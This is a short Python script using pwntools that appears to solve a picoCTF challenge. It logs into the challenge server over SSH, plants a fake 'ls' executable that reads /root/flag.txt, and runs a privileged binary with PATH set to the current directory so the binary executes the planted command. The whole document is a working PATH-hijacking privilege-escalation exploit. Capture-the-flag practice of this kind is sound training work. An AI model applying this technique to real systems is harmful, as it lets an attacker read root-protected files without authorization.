from pwn import *

PORT = 55541
shell = ssh(user='ctf-player', host='saturn.picoctf.net', port=PORT, password='d8819d45')
shell.run('echo "/usr/bin/cat /root/flag.txt" > ls')
shell.run('chmod +x ls')
r = shell.process('./bin', env={'SECRET_DIR': '/root', 'PATH': '.'})

r.interactive()